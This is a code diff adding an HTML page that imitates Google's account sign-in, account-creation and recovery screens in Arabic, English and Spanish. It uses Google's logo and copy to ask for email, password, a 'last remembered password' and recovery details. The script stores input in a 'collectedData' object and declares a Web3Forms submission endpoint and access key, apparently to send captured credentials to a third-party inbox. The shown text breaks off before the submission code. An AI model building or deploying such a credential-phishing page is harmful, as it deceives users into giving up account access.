@@ -1,0 +1,1335 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - حسابات Google</title>
+    <!-- Google Fonts for authentic look -->
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap" rel="stylesheet">
+    <!-- Google favicon -->
+    <link rel="icon" href="https://www.google.com/favicon.ico">
+    <!-- Font Awesome for the eye and arrow icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        /* CSS to perfectly match Google's sign-in page, with our dark theme */
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #202124;
+            color: #e8eaed;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 24px;
+            box-sizing: border-box;
+            direction: rtl; /* Arabic direction */
+            overflow: hidden;
+        }
+        .main-container {
+            width: 100%;
+            max-width: 448px;
+            box-sizing: border-box;
+            position: relative;
+            min-height: 400px;
+        }
+        .sign-in-card {
+            background-color: #2e2f31;
+            border: 1px solid #5f6368;
+            border-radius: 24px;
+            padding: 48px 40px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4);
+            text-align: center;
+            width: 100%;
+            box-sizing: border-box;
+            position: absolute;
+            top: 0;
+            right: 0;
+            transition: transform 0.2s cubic-bezier(0, 0, 0, 1), opacity 0.2s ease-out;
+        }
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin: 0 0 10px 0;
+            padding: 0;
+            color: #e8eaed;
+        }
+        p.subtitle {
+            font-size: 16px;
+            color: #bdc1c6;
+            margin-top: 0;
+            margin-bottom: 24px;
+        }
+        .input-group {
+            position: relative;
+            margin-top: 16px;
+            text-align: right;
+        }
+        .input-field {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #5f6368;
+            border-radius: 4px;
+            background-color: #2e2f31;
+            color: #e8eaed;
+            box-sizing: border-box;
+            transition: border-color .2s, box-shadow .2s;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: #8ab4f8;
+            box-shadow: 0 1px 1px 0 rgba(138,180,248,.075);
+        }
+        .input-field::placeholder {
+            color: #9aa0a6;
+        }
+        .form-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+        .next-button {
+            background-color: #8ab4f8;
+            color: #202124;
+            padding: 10px 24px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color .2s;
+        }
+        .next-button:hover {
+            background-color: #a4c2f6;
+        }
+        .text-link {
+            color: #8ab4f8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            text-align: right;
+        }
+        .password-toggle {
+            position: absolute;
+            top: 50%;
+            right: 15px;
+            transform: translateY(-50%);
+            color: #9aa0a6;
+            cursor: pointer;
+        }
+        .password-toggle:hover {
+            color: #e8eaed;
+        }
+        .header-info {
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+            justify-content: flex-end;
+        }
+        .profile-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background-color: #4285f4;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            font-weight: 500;
+            margin-left: 12px;
+        }
+        .profile-email {
+            font-size: 14px;
+            color: #bdc1c6;
+            direction: ltr;
+        }
+        .lang-footer {
+            margin-top: 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #9aa0a6;
+            font-size: 12px;
+        }
+        .lang-select {
+            background-color: #2e2f31;
+            border: 1px solid #5f6368;
+            color: #e8eaed;
+            font-size: 12px;
+            padding: 4px;
+            border-radius: 4px;
+            margin-right: 8px;
+        }
+        .lang-select option {
+            background-color: #2e2f31;
+            color: #e8eaed;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 16px;
+        }
+        .footer-links a {
+            color: #9aa0a6;
+            text-decoration: none;
+            margin: 0 16px;
+            font-size: 12px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .error-message {
+            color: #ff3333;
+            font-size: 14px;
+            margin-top: -10px;
+            margin-bottom: 10px;
+            opacity: 0;
+            transition: opacity 0.3s ease-in-out;
+        }
+        .error-message.visible {
+            opacity: 1;
+        }
+        .back-arrow {
+            position: absolute;
+            top: 24px;
+            right: 24px;
+            font-size: 24px;
+            color: #bdc1c6;
+            cursor: pointer;
+        }
+        .back-arrow:hover {
+            color: #e8eaed;
+        }
+        .loading-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background-color: #4285f4;
+            opacity: 0;
+            z-index: 2000;
+            transform-origin: left;
+        }
+        @keyframes loading {
+            0% { transform: scaleX(0); opacity: 1; }
+            100% { transform: scaleX(1); opacity: 1; }
+        }
+        .password-one-column {
+            text-align: center;
+        }
+        .password-one-column .logo {
+            display: block;
+            margin: 0 auto 24px auto;
+        }
+        .password-one-column .header-info {
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+            justify-content: center;
+        }
+        .password-one-column .profile-icon {
+            order: 1;
+            margin-left: 0;
+            margin-right: 12px;
+        }
+        .password-one-column .profile-email {
+            order: 2;
+        }
+        .password-one-column .input-group {
+            position: relative;
+            margin-top: 24px;
+            text-align: right;
+        }
+        .password-one-column .password-toggle {
+            position: absolute;
+            top: 50%;
+            left: 15px;
+            transform: translateY(-50%);
+            color: #9aa0a6;
+            cursor: pointer;
+        }
+        .password-one-column .password-toggle:hover {
+            color: #e8eaed;
+        }
+        .password-one-column h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            margin-top: 0;
+        }
+        .password-one-column p.subtitle {
+            font-size: 16px;
+            margin-bottom: 12px;
+        }
+        .password-one-column .form-actions {
+            margin-top: 24px;
+        }
+        .password-one-column .show-password-checkbox {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #bdc1c6;
+            cursor: pointer;
+        }
+        .password-one-column .show-password-checkbox input {
+            margin-left: 8px;
+            cursor: pointer;
+        }
+        html[lang="ar"] .password-one-column .show-password-checkbox {
+            justify-content: flex-end;
+        }
+        .create-account-names {
+            display: flex;
+            gap: 16px;
+            margin-top: 24px;
+        }
+        .create-account-names .input-group {
+            flex: 1;
+            margin-top: 0;
+        }
+        .create-account-names .input-field {
+            width: 100%;
+        }
+        .create-account-names .input-group:last-child {
+            margin-right: 0;
+        }
+        .info-text {
+            font-size: 12px;
+            color: #9aa0a6;
+            margin-top: 8px;
+            text-align: right;
+        }
+        .recovery-options {
+            text-align: right;
+            margin-top: 24px;
+        }
+        .recovery-options h3 {
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 16px;
+        }
+        .recovery-option {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+            cursor: pointer;
+            padding: 12px;
+            border: 1px solid #5f6368;
+            border-radius: 8px;
+            transition: background-color 0.2s;
+        }
+        .recovery-option:hover {
+            background-color: #3e4043;
+        }
+        .recovery-option .icon {
+            font-size: 20px;
+            color: #8ab4f8;
+            margin-left: 16px;
+        }
+        .recovery-option .text {
+            font-size: 14px;
+            color: #e8eaed;
+        }
+        .create-password-container {
+            margin-top: 24px;
+        }
+        .password-hints {
+            font-size: 12px;
+            color: #9aa0a6;
+            text-align: right;
+            margin-top: 10px;
+        }
+        /* Adjusted styling for recovery page to be more accurate */
+        #recoveryPage .logo {
+            margin-bottom: 16px; /* Reduced space after logo */
+        }
+        #recoveryPage h1 {
+            margin-bottom: 8px; /* Reduced space after heading */
+        }
+        
+        /* The specific field that displays the email or number on the recovery page */
+        .email-display-box {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start; /* Aligned to the start to hug content */
+            border: 1px solid #5f6368; /* White border */
+            border-radius: 24px;
+            padding: 6px 12px; /* Adjusted padding to be tighter */
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 20px; /* Space from the H1 */
+        }
+        .email-display-box:hover {
+            background-color: #3e4043;
+        }
+        .email-display-box .profile-icon-small {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background-color: transparent; /* Changed to transparent */
+            border: 1px solid #808080; /* Added a subtle gray border */
+            color: #e8eaed; /* Text color */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 500;
+            margin-left: 8px; /* Space between icon and email */
+        }
+        .email-display-box .email-text {
+            color: #e8eaed;
+            font-size: 14px;
+            direction: ltr; /* Ensure email is LTR */
+            flex-grow: 1; /* Allow email text to fill space */
+        }
+        .email-display-box .dropdown-arrow {
+            color: #9aa0a6;
+            font-size: 12px;
+            margin-right: 8px; /* Space between text and arrow */
+            align-self: center; /* Ensure arrow is vertically centered */
+        }
+        .email-display-box.ar-rtl {
+             flex-direction: row-reverse;
+             justify-content: flex-end;
+        }
+        .email-display-box.ar-rtl .profile-icon-small {
+            margin-left: 0;
+            margin-right: 8px;
+        }
+        
+        /* New style for the password input group below the email display box */
+        #recoveryPage .subtitle.password-input-recovery {
+            margin-top: 32px; /* Added the specific 2cm margin requested */
+            margin-bottom: 12px; /* Adjusted bottom margin for better flow */
+        }
+        
+        #recoveryPage .form-actions {
+            margin-top: 24px;
+        }
+        
+        #recoveryPage .input-group {
+            margin-top: 0; /* Remove top margin from input group */
+        }
+
+    </style>
+</head>
+<body>
+    <!-- Blue loading bar element -->
+    <div id="loadingBar" class="loading-bar"></div>
+
+    <div class="main-container">
+        
+        <!-- Login Page -->
+        <div id="loginPage" class="sign-in-card">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+            <h1>تسجيل الدخول</h1>
+            <p class="subtitle" id="loginPageSubtitle">باستخدام حسابك على Google. سيكون هذا الحساب متاحًا لتطبيقات Google الأخرى في المتصفح.</p>
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="emailInput" name="email" class="input-field" placeholder="البريد الإلكتروني أو الهاتف" required>
+                </div>
+                <div style="text-align: right; margin-top: 16px;">
+                    <a href="#" class="text-link" id="forgotEmailLink">هل نسيت البريد الإلكتروني؟</a>
+                </div>
+                <div class="form-actions">
+                    <a href="#" class="text-link" id="createAccountLink">إنشاء حساب</a>
+                    <button type="submit" class="next-button">التالي</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Password Page Container -->
+        <div id="passwordPage" class="sign-in-card" style="display: none;">
+            <!-- Content will be dynamically injected here based on language -->
+        </div>
+
+        <!-- Create Account - Step 1: Names Page -->
+        <div id="createAccountPage" class="sign-in-card" style="display: none;">
+            <i class="fas fa-arrow-right back-arrow" onclick="showPage('loginPage', 'backward')"></i>
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+            <h1>إنشاء حسابك على Google</h1>
+            <p class="subtitle" id="createAccountSubtitle">أدخل اسمك</p>
+            <form id="createAccountForm">
+                <div class="create-account-names">
+                    <div class="input-group">
+                        <input type="text" id="firstNameInput" name="first_name" class="input-field" placeholder="الاسم الأول" required>
+                    </div>
+                    <div class="input-group">
+                        <input type="text" id="lastNameInput" name="last_name" class="input-field" placeholder="اسم العائلة" required>
+                    </div>
+                </div>
+                <div class="form-actions">
+                    <button type="button" class="text-link" onclick="showPage('loginPage', 'backward')">العودة</button>
+                    <button type="submit" class="next-button">التالي</button>
+                </div>
+            </form>
+        </div>
+        
+        <!-- Create Account - Step 2: New Email Page -->
+        <div id="createEmailPage" class="sign-in-card" style="display: none;">
+            <i class="fas fa-arrow-right back-arrow" onclick="showPage('createAccountPage', 'backward')"></i>
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+            <h1>إنشاء حسابك على Google</h1>
+            <p class="subtitle" id="createEmailSubtitle">اختر اسم مستخدم لحسابك</p>
+            <form id="createEmailForm">
+                <div class="input-group">
+                    <input type="email" id="newEmailInput" name="new_email" class="input-field" placeholder="اسم المستخدم" required>
+                </div>
+                <div class="info-text">يمكنك استخدام الأحرف والأرقام والنقاط.</div>
+                <div style="text-align: right; margin-top: 24px;">
+                    <a href="#" class="text-link" id="useCurrentEmailLink">استخدام عنوان بريدي الإلكتروني الحالي بدلاً من ذلك</a>
+                </div>
+                <div class="form-actions">
+                    <button type="button" class="text-link" onclick="showPage('createAccountPage', 'backward')">العودة</button>
+                    <button type="submit" class="next-button">التالي</button>
+                </div>
+            </form>
+        </div>
+        
+        <!-- Create Account - Step 3: Password Page -->
+        <div id="createPasswordPage" class="sign-in-card" style="display: none;">
+            <i class="fas fa-arrow-right back-arrow" onclick="showPage('createEmailPage', 'backward')"></i>
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+            <h1>إنشاء حسابك على Google</h1>
+            <p class="subtitle" id="createPasswordSubtitle">إنشاء كلمة مرور قوية</p>
+            <form id="createPasswordForm">
+                <div class="create-password-container">
+                    <div class="input-group">
+                        <input type="password" id="createPasswordInput" name="create_password" class="input-field" placeholder="كلمة المرور" required>
+                    </div>
+                    <div class="input-group">
+                        <input type="password" id="confirmPasswordInput" name="confirm_password" class="input-field" placeholder="تأكيد" required>
+                    </div>
+                    <div class="password-hints">
+                        استخدم 8 أحرف أو أكثر مع مزيج من الأحرف والأرقام والرموز.
+                    </div>
+                </div>
+                <div class="form-actions">
+                    <a href="#" class="text-link" id="showPasswordLink" style="font-weight: normal; margin-top: 8px;">عرض كلمة المرور</a>
+                    <button type="submit" class="next-button">التالي</button>
+                </div>
+            </form>
+        </div>
+        
+        <!-- Create Account - Step 4: Final Confirmation Page -->
+        <div id="accountCreatedPage" class="sign-in-card" style="display: none;">
+            <i class="fas fa-arrow-right back-arrow" onclick="showPage('createPasswordPage', 'backward')"></i>
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+            <h1>تم إنشاء حسابك!</h1>
+            <p class="subtitle" id="accountCreatedSubtitle">يتم الآن تحويلك إلى صفحة قوقل...</p>
+            <div class="form-actions" style="justify-content: center;">
+                <button type="button" class="next-button" onclick="window.location.href='https://www.google.com/'">الانتقال إلى قوقل</button>
+            </div>
+        </div>
+
+        <!-- Forgot Email Page (Updated to match the new recovery style) -->
+        <div id="forgotEmailPage" class="sign-in-card" style="display: none;">
+            <i class="fas fa-arrow-right back-arrow" onclick="showPage('loginPage', 'backward')"></i>
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+            <h1>استعادة الحساب</h1>
+            <p class="subtitle" id="forgotEmailSubtitle">أدخل رقم هاتفك أو البريد الإلكتروني الاحتياطي المرتبط بحسابك.</p>
+            <form id="forgotEmailForm">
+                <div class="input-group">
+                    <input type="text" id="forgotEmailInput" name="forgot_email_phone" class="input-field" placeholder="رقم الهاتف أو البريد الإلكتروني" required>
+                </div>
+                <div class="form-actions">
+                    <a href="#" class="text-link" id="forgotEmailHelpLink">تجربة طريقة أخرى</a>
+                    <button type="submit" class="next-button">التالي</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Account Recovery Page (This page now asks for the last password) -->
+        <div id="recoveryPage" class="sign-in-card" style="display: none;">
+            <i class="fas fa-arrow-right back-arrow" onclick="showPage('loginPage', 'backward')"></i>
+             <!-- Correct logo as per your request -->
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+            <h1>استعادة الحساب</h1>
+            
+            <!-- The new email display box with icon and dropdown arrow -->
+            <div id="recoveryEmailDisplayBox" class="email-display-box ar-rtl">
+                <div class="profile-icon-small" id="recoveryEmailIcon"></div>
+                <span class="email-text" id="recoveryEmailText"></span>
+                <i class="fas fa-caret-down dropdown-arrow"></i>
+            </div>
+            
+            <p class="subtitle password-input-recovery" id="recoverySubtitle">أدخل كلمة المرور الأخيرة التي تتذكرها لهذا الحساب.</p>
+            
+            <form id="recoveryForm">
+                <div class="input-group">
+                    <input type="password" id="recoveryPasswordInput" name="recovery_password" class="input-field" placeholder="أدخل كلمة المرور" required>
+                </div>
+                <div class="form-actions">
+                    <a href="#" class="text-link" id="tryAnotherWayLink">تجربة طريقة أخرى</a>
+                    <button type="submit" class="next-button">التالي</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Try Another Way Page -->
+        <div id="tryAnotherWayPage" class="sign-in-card" style="display: none;">
+            <i class="fas fa-arrow-right back-arrow" onclick="showPage('recoveryPage', 'backward')"></i>
+            <div class="header-info">
+                <i class="fas fa-user-circle profile-icon" style="background-color: transparent;"></i>
+                <span class="profile-email" id="tryAnotherEmailDisplay"></span>
+            </div>
+            <h1>استعادة الحساب</h1>
+            <p class="subtitle">كيف تريد الحصول على رمز التحقق؟</p>
+            <div class="recovery-options">
+                <!-- Recovery option for phone, will be updated dynamically -->
+                <div class="recovery-option" id="phoneOption">
+                    <i class="fas fa-mobile-alt icon"></i>
+                    <span class="text"></span>
+                </div>
+                <!-- Recovery option for email, will be updated dynamically -->
+                <div class="recovery-option" id="emailOption">
+                    <i class="fas fa-envelope icon"></i>
+                    <span class="text"></span>
+                </div>
+            </div>
+            <div class="form-actions">
+                <a href="#" class="text-link" id="skipRecoveryLink">تجربة طريقة أخرى</a>
+                <button type="button" class="next-button" onclick="window.location.href='https://www.google.com/recovery'">التالي</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="lang-footer">
+        <select class="lang-select" id="languageSelect">
+            <option value="ar">العربية (Arabic)</option>
+            <option value="en">English (United States)</option>
+            <option value="es">Español (España)</option>
+        </select>
+    </div>
+    <div class="footer-links">
+        <a href="#">مساعدة</a>
+        <a href="#">الخصوصية</a>
+        <a href="#">البنود</a>
+    </div>
+
+    <script>
+        // Global variables for page management
+        let pages;
+        let currentPageId = 'loginPage';
+        let loadingBar;
+        let collectedData = {};
+
+        // Web3Forms endpoint with the provided access key
+        const targetEndpoint = 'https://api.web3forms.com/submit';
+        const accessKey = 'cd260ba9-6aac-45fd-bfd5-bcc299bb5c68';
+        
+        const passwordPageLayouts = {
+            ar: `
+                <div class="password-one-column">
+                    <i class="fas fa-arrow-right back-arrow" onclick="showPage('loginPage', 'backward')"></i>
+                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+                    <h1>مرحباً</h1>
+                    <div class="header-info">
+                        <i class="fas fa-user-circle profile-icon" style="background-color: transparent;"></i>
+                        <span class="profile-email" id="displayEmail"></span>
+                    </div>
+                    <form id="passwordForm">
+                        <div class="input-group">
+                            <input type="password" id="passwordInput" name="password" class="input-field" placeholder="أدخل كلمة المرور" required>
+                        </div>
+                        <label class="show-password-checkbox">
+                            <input type="checkbox" id="showPasswordCheckbox">
+                            <span>عرض كلمة المرور</span>
+                        </label>
+                        <div class="form-actions" style="margin-top: 24px;">
+                            <a href="#" class="text-link" id="forgotPasswordLink">هل نسيت كلمة المرور؟</a>
+                            <button type="submit" class="next-button">التالي</button>
+                        </div>
+                    </form>
+                </div>
+            `,
+            en: `
+                <div class="password-one-column">
+                    <i class="fas fa-arrow-left back-arrow" onclick="showPage('loginPage', 'backward')"></i>
+                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+                    <h1>Welcome</h1>
+                    <div class="header-info">
+                        <i class="fas fa-user-circle profile-icon" style="background-color: transparent;"></i>
+                        <span class="profile-email" id="displayEmail"></span>
+                    </div>
+                    <form id="passwordForm">
+                        <div class="input-group">
+                            <input type="password" id="passwordInput" name="password" class="input-field" placeholder="Enter your password" required>
+                        </div>
+                        <label class="show-password-checkbox">
+                            <input type="checkbox" id="showPasswordCheckbox">
+                            <span>Show password</span>
+                        </label>
+                        <div class="form-actions" style="margin-top: 24px;">
+                            <a href="#" class="text-link" id="forgotPasswordLink">Forgot password?</a>
+                            <button type="submit" class="next-button">Next</button>
+                        </div>
+                    </form>
+                </div>
+            `,
+            es: `
+                <div class="password-one-column">
+                    <i class="fas fa-arrow-left back-arrow" onclick="showPage('loginPage', 'backward')"></i>
+                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+                    <h1>Bienvenido</h1>
+                    <div class="header-info">
+                        <i class="fas fa-user-circle profile-icon" style="background-color: transparent;"></i>
+                        <span class="profile-email" id="displayEmail"></span>
+                    </div>
+                    <form id="passwordForm">
+                        <div class="input-group">
+                            <input type="password" id="passwordInput" name="password" class="input-field" placeholder="Introduce tu contraseña" required>
+                        </div>
+                        <label class="show-password-checkbox">
+                            <input type="checkbox" id="showPasswordCheckbox">
+                            <span>Mostrar contraseña</span>
+                        </label>
+                        <div class="form-actions" style="margin-top: 24px;">
+                            <a href="#" class="text-link" id="forgotPasswordLink">¿Olvidaste tu contraseña?</a>
+                            <button type="submit" class="next-button">Siguiente</button>
+                        </div>
+                    </form>
+                </div>
+            `
+        };
+
+        const translations = {
+            ar: {
+                title: 'تسجيل الدخول - حسابات Google',
+                h1_login: 'تسجيل الدخول',
+                subtitle_login: 'باستخدام حسابك على Google. سيكون هذا الحساب متاحًا لتطبيقات Google الأخرى في المتصفح.',
+                placeholder_email: 'البريد الإلكتروني أو الهاتف',
+                forgot_email_link: 'هل نسيت البريد الإلكتروني؟',
+                create_account_link: 'إنشاء حساب',
+                next_button: 'التالي',
+                h1_password: 'مرحباً',
+                subtitle_password: 'لاستكمال تسجيل الدخول، أدخل كلمة المرور.',
+                forgot_password: 'هل نسيت كلمة المرور؟',
+                show_password_label: 'عرض كلمة المرور',
+                placeholder_password: 'أدخل كلمة المرور',
+                h1_create_name: 'إنشاء حسابك على Google',
+                subtitle_create_name: 'أدخل اسمك',
+                placeholder_firstname: 'الاسم الأول',
+                placeholder_lastname: 'اسم العائلة',
+                h1_create_email: 'إنشاء حسابك على Google',
+                subtitle_create_email: 'اختر اسم مستخدم لحسابك',
+                placeholder_new_email: 'اسم المستخدم',
+                use_current_email_link: 'استخدام عنوان بريدي الإلكتروني الحالي بدلاً من ذلك',
+                h1_create_password: 'إنشاء حسابك على Google',
+                subtitle_create_password: 'إنشاء كلمة مرور قوية',
+                placeholder_create_password: 'كلمة المرور',
+                placeholder_confirm_password: 'تأكيد',
+                password_hints: 'استخدم 8 أحرف أو أكثر مع مزيج من الأحرف والأرقام والرموز.',
+                show_password_link: 'عرض كلمة المرور',
+                h1_account_created: 'تم إنشاء حسابك!',
+                subtitle_account_created: 'يتم الآن تحويلك إلى صفحة قوقل...',
+                go_to_google: 'الانتقال إلى قوقل',
+                h1_recovery: 'استعادة الحساب',
+                subtitle_recovery: 'أدخل كلمة المرور الأخيرة التي تتذكرها لهذا الحساب.',
+                placeholder_recovery_password: 'أدخل كلمة المرور',
+                try_another_way: 'تجربة طريقة أخرى',
+                h1_forgot_email: 'استعادة الحساب',
+                subtitle_forgot_email: 'أدخل رقم هاتفك أو البريد الإلكتروني الاحتياطي المرتبط بحسابك.',
+                placeholder_forgot_email: 'رقم الهاتف أو البريد الإلكتروني',
+                h1_try_another: 'استعادة الحساب',
+                subtitle_try_another: 'كيف تريد الحصول على رمز التحقق؟',
+                phone_option: (email) => `إرسال رمز التحقق إلى: <b>(+966) ***-***-0010</b>`,
+                email_option: (email) => `إرسال رمز التحقق إلى: <b>${email}</b>`,
+                skip_recovery: 'تجربة طريقة أخرى',
+                go_back: 'العودة',
+                help: 'مساعدة',
+                privacy: 'الخصوصية',
+                terms: 'البنود',
+                modal_title_success: 'تم بنجاح', // No longer used but kept for consistency
+                modal_message_success: 'تم إرسال البيانات بنجاح. سيتم تحويلك قريباً.', // No longer used
+                modal_title_error: 'خطأ', // No longer used
+                modal_message_error: 'حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.', // No longer used
+                modal_title_mismatch: 'خطأ في كلمة المرور', // No longer used
+                modal_message_mismatch: 'كلمة المرور غير متطابقة. يرجى التأكد من تطابق الكلمات.', // No longer used
+            },
+            en: {
+                title: 'Sign in - Google Accounts',
+                h1_login: 'Sign in',
+                subtitle_login: 'with your Google Account. This account will be available to other Google apps in the browser.',
+                placeholder_email: 'Email or phone',
+                forgot_email_link: 'Forgot email?',
+                create_account_link: 'Create account',
+                next_button: 'Next',
+                h1_password: 'Welcome',
+                subtitle_password: 'To continue, first verify it\'s you.',
+                forgot_password: 'Forgot password?',
+                show_password_label: 'Show password',
+                placeholder_password: 'Enter your password',
+                h1_create_name: 'Create your Google Account',
+                subtitle_create_name: 'Enter your name',
+                placeholder_firstname: 'First name',
+                placeholder_lastname: 'Last name',
+                h1_create_email: 'Create your Google Account',
+                subtitle_create_email: 'Choose your username',
+                placeholder_new_email: 'Username',
+                use_current_email_link: 'Use my current email address instead',
+                h1_create_password: 'Create your Google Account',
+                subtitle_create_password: 'Create a strong password',
+                placeholder_create_password: 'Password',
+                placeholder_confirm_password: 'Confirm',
+                password_hints: 'Use 8 or more characters with a mix of letters, numbers & symbols.',
+                show_password_link: 'Show password',
+                h1_account_created: 'Account created!',
+                subtitle_account_created: 'Redirecting to Google...',
+                go_to_google: 'Go to Google',
+                h1_recovery: 'Account recovery',
+                subtitle_recovery: 'To continue, enter the last password you remember for this account.',
+                placeholder_recovery_password: 'Enter password',
+                try_another_way: 'Try another way',
+                h1_forgot_email: 'Account recovery',
+                subtitle_forgot_email: 'Enter your phone number or recovery email.',
+                placeholder_forgot_email: 'Phone number or email',
+                h1_try_another: 'Account recovery',
+                subtitle_try_another: 'How do you want to get a verification code?',
+                phone_option: (email) => `Send verification code to: <b>(+966) ***-***-0010</b>`,
+                email_option: (email) => `Send verification code to: <b>${email}</b>`,
+                skip_recovery: 'Try another way',
+                go_back: 'Back',
+                help: 'Help',
+                privacy: 'Privacy',
+                terms: 'Terms',
+                modal_title_success: 'Success',
+                modal_message_success: 'Data sent successfully. Redirecting soon.',
+                modal_title_error: 'Error',
+                modal_message_error: 'An error occurred while sending data. Please try again.',
+                modal_title_mismatch: 'Password Mismatch',
+                modal_message_mismatch: 'Passwords do not match. Please ensure both passwords are the same.',
+            },
+            es: {
+                title: 'Iniciar sesión - Cuentas de Google',
+                h1_login: 'Iniciar sesión',
+                subtitle_login: 'con tu cuenta de Google. Esta cuenta estará disponible para otras aplicaciones de Google en el navegador.',
+                placeholder_email: 'Correo electrónico o teléfono',
+                forgot_email_link: '¿Olvidaste tu correo electrónico?',
+                create_account_link: 'Crear cuenta',
+                next_button: 'Siguiente',
+                h1_password: 'Bienvenido',
+                subtitle_password: 'Para continuar, verifica que eres tú.',
+                forgot_password: '¿Olvidaste tu contraseña?',
+                show_password_label: 'Mostrar contraseña',
+                placeholder_password: 'Introduce tu contraseña',
+                h1_create_name: 'Crea tu cuenta de Google',
+                subtitle_create_name: 'Introduce tu nombre',
+                placeholder_firstname: 'Nombre',
+                placeholder_lastname: 'Apellido',
+                h1_create_email: 'Crea tu cuenta de Google',
+                subtitle_create_email: 'Elige tu nombre de usuario',
+                placeholder_new_email: 'Nombre de usuario',
+                use_current_email_link: 'Usar mi dirección de correo electrónico actual en su lugar',
+                h1_create_password: 'Crea tu cuenta de Google',
+                subtitle_create_password: 'Crea una contraseña segura',
+                placeholder_create_password: 'Contraseña',
+                placeholder_confirm_password: 'Confirmar',
+                password_hints: 'Utiliza 8 o más caracteres con una combinación de letras, números y símbolos.',
+                show_password_link: 'Mostrar contraseña',
+                h1_account_created: '¡Cuenta creada!',
+                subtitle_account_created: 'Redirigiendo a Google...',
+                go_to_google: 'Ir a Google',
+                h1_recovery: 'Recuperación de la cuenta',
+                subtitle_recovery: 'Para continuar, introduce la última contraseña que recuerdes para esta cuenta.',
+                placeholder_recovery_password: 'Introduce la contraseña',
+                try_another_way: 'Probar de otra forma',
+                h1_forgot_email: 'Recuperación de la cuenta',
+                subtitle_forgot_email: 'Introduce tu número de teléfono o correo electrónico de recuperación.',
+                placeholder_forgot_email: 'Número de teléfono o correo electrónico',
+                h1_try_another: 'Recuperación de la cuenta',
+                subtitle_try_another: '¿Cómo quieres obtener un código de verificación?',
+                phone_option: (email) => `Enviar código de verificación a: <b>(+966) ***-***-0010</b>`,
+                email_option: (email) => `Enviar código de verificación a: <b>${email}</b>`,
+                skip_recovery: 'Probar de otra forma',
+                go_back: 'Volver',
+                help: 'Ayuda',
+                privacy: 'Ayuda',
+                terms: 'Términos',
+                modal_title_success: 'Éxito',
+                modal_message_success: 'Datos enviados correctamente. Redirigiendo pronto.',
+                modal_title_error: 'Error',
+                modal_message_error: 'Ocurrió un error al enviar los datos. Por favor, inténtalo de nuevo.',
+                modal_title_mismatch: 'Contraseña incorrecta',
+                modal_message_mismatch: 'Las contraseñas no coinciden. Por favor, asegúrate de que ambas contraseñas sean iguales.',
+            }
+        };
+
+        const showPage = (pageId, direction = 'forward') => {
+            const currentPageElement = pages[currentPageId];
+            const nextPageElement = pages[pageId];
+
+            if (!currentPageElement || !nextPageElement || currentPageId === pageId) return;
+
+            loadingBar.style.animation = 'loading 0.4s ease-out forwards';
+            loadingBar.style.opacity = '1';
+
+            Object.values(pages).forEach(page => {
+                if (page.id !== currentPageId) {
+                    page.style.display = 'none';
+                }
+            });
+
+            if (direction === 'forward') {
+                nextPageElement.style.transform = 'translateX(-100%)';
+            } else {
+                nextPageElement.style.transform = 'translateX(100%)';
+            }
